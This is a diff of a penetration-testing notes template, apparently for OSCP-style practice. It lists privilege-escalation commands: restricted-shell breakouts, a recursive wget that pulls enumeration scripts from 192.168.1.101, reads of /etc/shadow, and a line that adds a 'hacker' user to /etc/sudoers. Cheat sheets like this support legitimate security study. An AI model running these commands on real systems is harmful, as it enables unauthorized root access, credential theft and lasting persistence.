@@ -1,4 +1,3 @@
-
 ## Info-sheet
 
 - DNS-Domain name:
@@ -9,21 +8,11 @@
 - Workgroup:
 - Windows domain:
 
-
-
-
-
 ----------------------------------------------------------------------------
-
-
 
 '''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''
 
-
-
 -----------------------------------------------------------------------------
-
-
 
 ## Privilege escalation
 
@@ -52,32 +41,59 @@ Here you will add all possible leads. What to try.
 
 ### Useful commands
 
-```
-# Spawning shell
+
+###  Spawning shell
 python -c 'import pty; pty.spawn("/bin/sh")'
+
+### if commands are limited, you break out of the "jail" shell?
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+echo os.system('/bin/bash')
+
+/bin/sh -i
+
+/bin/sh
+
+exec /bin/bash
+
+/bin/bash
+
+/bin/ksh
+
+/bin/zsh
+
+/bin/dash
+
 
 # Access to more binaries
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 # Set up webserver
+
 cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080
 
 # Download all files
-wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check
+wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py 
+
+unix-privesc-check
 
 ./LinEnum.sh -t -k password -r LinEnum.txt
+
 python linprivchecker.py extended
+
 ./unix-privesc-check standard
 
 
 # Writable directories
 /tmp
+
 /var/tmp
 
 
 # Add user to sudoers
+
 echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
-```
 
 
 ### Basic info
@@ -95,31 +111,46 @@ echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
 **Users with login:**
 
-```
+
+
 uname -a
+
 env
+
 id
+
 cat /proc/version
+
 cat /etc/issue
+
 cat /etc/passwd
+
 cat /etc/group
+
 cat /etc/shadow
+
 cat /etc/hosts
 
 # Users with login
+
 grep -vE "nologin" /etc/passwd
 
 # Priv Enumeration Scripts
 
 
 upload /unix-privesc-check
+
 upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
+
 upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./
 
 python linprivchecker.py extended
+
 ./LinEnum.sh -t -k password
+
 unix-privesc-check
-```
+
+
 
 ### Kernel exploits
 
@@ -267,17 +298,9 @@ Require user interaction
 
 
 
-
-
 ------------------------------------------------------------------------
 
-
-
-
 ----------------------------- LOOT LOOT LOOT LOOT ----------------------
-
-
-
 
 ------------------------------------------------------------------------
 
